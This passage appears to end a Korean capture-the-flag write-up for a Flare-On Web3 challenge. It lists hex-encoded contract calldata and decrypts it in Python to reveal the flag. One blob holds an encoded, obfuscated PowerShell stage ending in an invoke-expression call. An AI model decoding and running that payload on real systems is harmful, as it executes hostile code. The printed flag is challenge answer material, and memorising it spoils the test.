6c4e42526a4242533046424e5546455355464c5555467951555a7a51564633516d394252305642593264435a4546445a30465864304a705155687251565a42516b5a42526a4242545546434e4546455930464e5155467751554e7a51566433516d70425232644257564643553046474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f64304a7051554e7251557433516d4a42523031425955464361454647535546595555467651555a7a5156466e516c704253464642556c46435a4546455155466c51554577515564525155745251584a42526e4e4257586443623046485255466a5a304a6b51554e6e5155316e5158684251334e42543046424e5546446130464c64304a695155644e51574642516d6842526b6c4257464642623046455455464e555546795155527251553542515842425132744253576442634546424d4546445a3046725155684251556c4251546c425130464254554642546b46426230465864304a745155646e5156706e516a564252303142574646424e6b4645623046575a304a775155684a51575242516a464252305642596b46435555464953554669643049775155645651566c33516a424251326442536b4643645546486230466c5555497a5155646a51574a3351584e4251304642563364434d554648613046695a3049775155524e5155316e516d524252465642544546425a3046455155466c51554577515552425155784251576442526e4e425932644362454648575546595555467251556842515574525155354251573942536b464362304648525546695155493151554e42515642525157644251306c42545546434e45464653554650515546705155457751554e6e5157744252314642576b4643645546485930464a5155453551554e4251556c6e5158644253476442546c46424d304644535546455555464c51554e5251575642516d744252315642593146425a3046454d45464a515546705155524251575642515864425245464253576442546b46426230464b51554a305155644a51574e6e516d314251304642554646425a3046445355464e51554930515552425155353351576c425154424251326442613046485655466b64304a6f5155684651556c4251546c425130464253576442643046495a3046505155463351554e4a515552525155744251314642576d6443654546496230466b5155466e5155517751556c4251576c42524546425a554643524546455455464a5a30464f5155467651557042516a564252316c42596d6443635546485355464a5155453551554e4251566433516b4e42534774425a454643624546476330465955554a6b51554e4251557442515774425232644257564643633046496130464d515546725155645251567042516e564252324e4254454642613046495a30466151554a73515568465155784251577442527a424257576443655546485755464d5155467951554e5251567052516a4e425230564259314642633046446330464b51554a74515568465157566e516a424251327442524646425330464763304656643049315155684e51575242516d7842527a42425447644355304649565546695a3049775155647251574a52516d7842517a524255314643645546495555466155554a355155633451574e42516c524252315642593264434d6b46486130465a64304a735155684e5155786e516b35425230564259326443656b46485a30465a55554a7a515559775155396e51545a4252553142596e6443643046496130464c51554672515568725156706e516e56425232394257576442633046445155464e5155467a51554e4251557042516e5642523239425a5646434d304648593046696430467a51554e425155356e515842425154303949696b7066476c6c65413d3d000000000000000000000000,
        0x916ed24b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008a4d2b324d3864646e666d733151686b3455783433564756726f6d38775562544d70475a7332444438536c485a3558345a37436273665a586d6144456f352b536e4c6f2f694c615168702b72652b2b5a6158645148683858796d593653733043326e71324b50646a2f3357656d3838714e5442577438596a7342764442426a45595a492b586c513d3d3d3d00000000000000000000000000000000000000000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000c84667585230317141345547506376484d7670317935553734454a73396756696e345051356c3648614c2b7953786b327030572b64364a694c784e444a7071686c76734f632b714655435338586d776b764135462b49697745515a5759496672334e754639322f5458586d6b5749416c73496d6c55466155373834336570564e64746134696d472b49746d47394b386d394e6269506264634861564769614668504d715772576d4168753850686a6f6958585335396b46616e7750794465755879392b4a4566416a61000000000000000000000000000000000000000000000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a864502f476c6b456e656a705a6f3032394f624d75346c5a306a646650314147415a4572324b676f3143672b75684b677a7061477974446741517855386a58762f31616441747054685368587534775970534e54446f344464776b46794633513434582f4b336c6f634568494249443551664f584566786478703458456a784748624d4c71504572506e526d616d546d6d43555446614958507768563378413039775156333443553d000000000000000000000000000000000000000000000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a864502f476c6b456e656a705a6f3032394f624d75346c5a306a646650314147415a4572324b676f3143672b75684b677a7061477974446741517855386a58762f31616441747054685368587534775970534e54446f344464776b46794633513434582f4b336c6f634568494249443551664f584566786478703458456a784748624d4c71504572506e526d616d546d6d43555446614958507768563378413039775156333443553d000000000000000000000000000000000000000000000000,
        0x916ed24b00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000078635253494a59654e5f6f66526972743668667636424b3548357649656e494b614969734a5275704d66366678676c4b4b4931384a4e50444742536b766f414c626866666245506848574346615a67424942477347496d6d70714f704c4c6b6c5643475554326f764346384d6b5279463172665233767046380000000000000000,
    ]
    decrypt(ciphertexts)
```

<br />

flag가 잘 출력되었다. 

`b'\x07v;)y3sxd\x08\x127\x16\x10(_bj Y{\x07zXr\x0feS-\x14\x0b\x04"w|v%\'=\x13g*.8X#/'`

`b'N0t_3v3n_DPRK_i5_Th15_1337_1n_Web3@flare-on.com'`

`b'Yet more noise!!'`

`b'Good thing this is on the testnet'`